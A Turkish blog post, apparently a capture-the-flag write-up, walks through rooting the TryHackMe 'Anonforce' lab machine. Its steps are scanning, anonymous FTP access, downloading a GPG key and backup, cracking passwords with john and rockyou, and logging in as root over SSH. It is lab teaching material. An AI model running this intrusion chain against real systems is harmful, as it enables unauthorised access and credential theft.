---
title: "Anonforce Makine Çözümü"
date: "2025-03-22"
tags: ["ctf", "tryhackme"]
---

Merhabalar, bu yazımda sizlere [TryHackMe](https://tryhackme.com/) platformunda bulunan "Anonforce" isimli makinenin çözümü anlatacağım. Keyifli Okumalar...

1 - *Nmap* aracını kullanarak makine üzerindeki açık portlar ve servisler hakkında detaylı bilgi ediniyorum.

```shell
nmap -sS -sV -O 10.10.97.179
```

2 - Makine üzerinde FTP ve SSH portlarının açık olduğunu görüyorum.

```
Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-05 15:00 +03
Nmap scan report for 10.10.97.179
Host is up (0.071s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

3 - Nmap aracını kullanarak Anonymous FTP testi yapıyorum. FTP servisine anonymous:anonymous bilgileri ile giriş yapılabildiğini görüyorum.

```
> nmap --script ftp-anon -p 21 10.10.97.179

*
PORT   STATE SERVICE
21/tcp open  ftp
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
*
```

4 - "notread" dizinin içinde "backup.gpg" ve "private.asc" adında iki dosya mevcut. mget ile bunları indiriyorum.

```shell
> ftp 10.10.97.179

*
ftp> ls
229 Entering Extended Passive Mode (|||61485|)
150 Here comes the directory listing.
-rwxrwxrwx    1 1000     1000          524 Aug 11  2019 backup.pgp
-rwxrwxrwx    1 1000     1000         3762 Aug 11  2019 private.asc
226 Directory send OK.
ftp> mget *
*
```

5 - "private.asc" dosyasının şifresini kırmak için john aracını kullanıyorum.

```
> gpg2john private.asc > hash
> john hash -w=/usr/share/wordlists/rockyou.txt
```

6 - GPG dosyasını içeri aktardığımda bir shadow dosyası içeriği görüyorum. Tekrardan john aracı ile root kullanıcısının şifresini kırmaya çalışıyor.

```shell
> gpg --import private.asc

*
root:$6$07**************************************
*

> john hash -w=/usr/share/wordlists/rockyou.txt
```

7 - SSH ile makineye bağlanıyorum.

```bash
> ssh root@10.10.97.179
```

8 - Makine üzerindeki bayrakları okuyarak odayı tamamlıyorum.
`
```bash
root@ubuntu:~# ls
root.txt
root@ubuntu:~# cat root.txt
***CENSORED***
root@ubuntu:~# ls /home
melodias
root@ubuntu:~# cat /home/melodias/user.txt 
***CENSORED***
```